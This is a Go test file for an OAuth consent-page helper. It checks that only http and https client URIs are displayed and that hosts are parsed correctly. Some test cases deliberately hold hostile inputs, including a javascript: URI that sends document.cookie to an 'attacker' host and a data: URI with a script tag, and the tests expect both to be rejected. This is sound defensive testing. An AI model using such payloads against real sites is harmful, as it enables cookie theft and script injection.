package api

import (
	"context"
	"errors"
	"testing"

	"github.com/stretchr/testify/mock"
	"go.lumeweb.com/oauth"
	portalMocks "go.lumeweb.com/portal/core/testing/mocks"
)

func TestDisplayClientURI(t *testing.T) {
	cases := []struct {
		name      string
		clientID  string
		uri       string
		clientErr error
		want      string
	}{
		{name: "valid https", clientID: "c", uri: "https://publisher.example/oauth-client.json", want: "https://publisher.example/oauth-client.json"},
		{name: "valid http", clientID: "c", uri: "http://publisher.example/md", want: "http://publisher.example/md"},
		{name: "empty uri", clientID: "c", uri: "", want: ""},
		// A hostile or non-URL client_uri must never reach the consent page
		// href, whether as a javascript:/data: scheme, a relative URL, or a
		// scheme-less value.
		{name: "javascript scheme rejected", clientID: "c", uri: "javascript:fetch('//attacker/'+document.cookie)", want: ""},
		{name: "data scheme rejected", clientID: "c", uri: "data:text/html,<script>alert(1)</script>", want: ""},
		{name: "protocol-relative rejected", clientID: "c", uri: "//host/path", want: ""},
		{name: "scheme-less value rejected", clientID: "c", uri: "not-a-url", want: ""},
		{name: "client lookup error", clientID: "unknown", uri: "https://publisher.example/md", clientErr: errors.New("not found"), want: ""},
		// An empty client id short-circuits before any store read.
		{name: "empty client id", clientID: "", uri: "https://publisher.example/md", want: ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			svc := new(portalMocks.MockOAuthProviderService)
			ext := &OAuthExtension{oauthSvc: svc}

			// The empty-client-id case returns before touching the store.
			if tc.clientID != "" {
				svc.On("GetClientMetadata", mock.Anything, tc.clientID).Return(&oauth.Client{
					ClientID:  tc.clientID,
					ClientURI: tc.uri,
				}, tc.clientErr)
			}

			if got := ext.displayClientURI(context.Background(), tc.clientID); got != tc.want {
				t.Fatalf("displayClientURI(%q) = %q, want %q", tc.clientID, got, tc.want)
			}
			svc.AssertExpectations(t)
		})
	}
}

func TestClientURIHost(t *testing.T) {
	for _, tt := range []struct {
		in   string
		want string
	}{
		{"https://publisher.example/oauth-client.json", "publisher.example"},
		{"https://www.mcpjam.com/.well-known/oauth/client-metadata.json", "www.mcpjam.com"},
		{"http://mcp.example:8080/md", "mcp.example:8080"},
		{"", ""},
		{"not a url", ""},
	} {
		if got := clientURIHost(tt.in); got != tt.want {
			t.Errorf("clientURIHost(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}
